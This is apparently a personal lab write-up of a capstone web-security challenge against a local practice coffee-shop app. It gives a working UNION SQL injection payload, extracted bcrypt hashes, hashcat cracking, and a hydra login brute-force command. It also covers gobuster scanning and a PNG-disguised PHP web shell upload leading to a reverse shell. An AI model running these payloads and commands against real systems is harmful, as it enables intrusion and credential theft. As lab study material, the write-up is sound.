- Challenge: **Find as many impactful vulnerabilities as you can and find information.**

# DOM and stored XSS
---
- Signup and login as normal user
- Add a comment:
	- `<H1> HI </H1>`
	- ![[Pasted image 20250407170712.png]]
	- ![[Pasted image 20250407171125.png]]
- In `message` parameter:
	- ![[Pasted image 20250408033438.png]]

# IDOR
---
- ![[Pasted image 20250407171211.png]]


# Something
---
![[Pasted image 20250407171914.png]]

# Bad design (modifiable fixed input)
---
![[Pasted image 20250408033718.png]]
![[Pasted image 20250408033733.png]]

# SQL Injection in `coffee.php?coffee=` parameter
---
![[Pasted image 20250408040925.png]]
- `No coffee` found means injection didn't work, but it works:
	- ![[Pasted image 20250408041317.png]]
- Extract data: 7 columns:
	- ![[Pasted image 20250408041605.png]]
	- Usernames: `'UNION+SELECT+NULL,NULL,NULL,NULL,NULL,username,NULL+from+users%23 `
		- ![[Pasted image 20250408041856.png]]
	- List of users:
		- `jeremy,jessamy,raj,bob,maria,amir,xinyi,kofi`
	- List of password hashes:
	`'UNION+SELECT+NULL,NULL,NULL,NULL,NULL,username,NULL+from+password%23 `

		```
		$2y$10$F9bvqz5eoawIS6g0FH.wGOUkNdBYLFBaCSzXvo2HTegQdNg/HlMJy
		$2y$10$meh2WXtPZgzZPZrjAmHi2ObKk6uXd2yZio7EB8t.MVuV1KwhWv6yS
		$2y$10$cCXaMFLC.ymTSqu1whYWbuU38RBN900NutjYBvCClqh.UHHg/XfFy
		$2y$10$ojC8YCMKX2r/Suqco/h.TOFTIaw5k3Io5FVSCeWjCCqL8GWwmAczC
		$2y$10$EPM4Unjn4wnn4SjoEPJu7em6OLISImA50QS3T1jCLyh48d7Pv6KBi
		$2y$10$qAXjb233b7CMHc69CU.8ueluFWZDt9f08.XYJjsJ.EfC/O5JGSOqW
		$2y$10$37gojoTFmj86E6NbENGg9e2Xu2z6OKKSgnjYxDkXJn/8dvSk2tKfG
		$2y$10$5sVvPfZOjzRTSeXJtQBGc.CfsDEwvITNkIg2IF9jSBhZZ1Rq.IK3.
		$2y$10$HBY/B4PCvsp4RR5HwKhUde5BaS7rQOX1yGmqfkXN9uq7/DQZZuyR2
		$2y$10$aWu4cu6YPfhpmSZcii9PRuY39sVU1tq7URmf198arbvQe0Gz.7.UK
		```
# Weak passwords
---
- Cracking the passwords hashes:
	- `hashcat hashes.txt passwords.txt -m 3200` => bcrypt (O.S)
		- ![[Pasted image 20250408042943.png]]
- Found later:
	- `5sVvPfZOjzRTSeXJtQBGc.CfsDEwvITNkIg2IF9jSBhZZ1Rq.IK3.:paris`
- ==**Found `jeremy`'s password using only `hashcat`'s GPU cracking**==:
	- ![[Pasted image 20250408112205.png]]
	- `captain1`
# Bruteforce
---
- Using `hydra` as it can **follow redirects**:
	- `hydra -L usernames.txt  -P passwords.txt localhost  http-post-form "/capstone/auth.php:username=^USER^&password=^PASS^&auth=login:F=Login failed" -v -t 64`
		- ![[Pasted image 20250408112449.png]]

# Gobuster for directory bruteforce
---
`gobuster dir -u http://localhost/capstone/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -n -x php,txt,zip `
![[Pasted image 20250408043357.png]]

# Admin Panel (Using `jeremy : captain1`):
---
![[Pasted image 20250408112649.png]]

# File Upload Vulnerability
----
- Uploading a normal `php` file throws error `Please upload a png file`
	- ![[Pasted image 20250408120702.png]]
- How about we add `png` magic bytes in a shell?
	- ![[Pasted image 20250408120739.png]]
	- ==**Generally, only the upper text is needed, but in this challenge, adding the lower one was also required (this was form boundry :P)**==
	- And this was uploaded `successfully`
- Finding the uploaded shell
	- This was the image of `coffee`, so we can look at where other `coffee` bean images are located from UI:
		- ![[Pasted image 20250408120935.png]]
	- These are **ordered, based on uploads**
	- My file was `19.php` (Note:- **Server only renames file name, not extension**)
		- ![[Pasted image 20250408121043.png]]
	- Let's get a reverse shell:
		- ![[Pasted image 20250408121156.png]]
		- ![[Pasted image 20250408121206.png]]
		- ![[Pasted image 20250408121225.png]]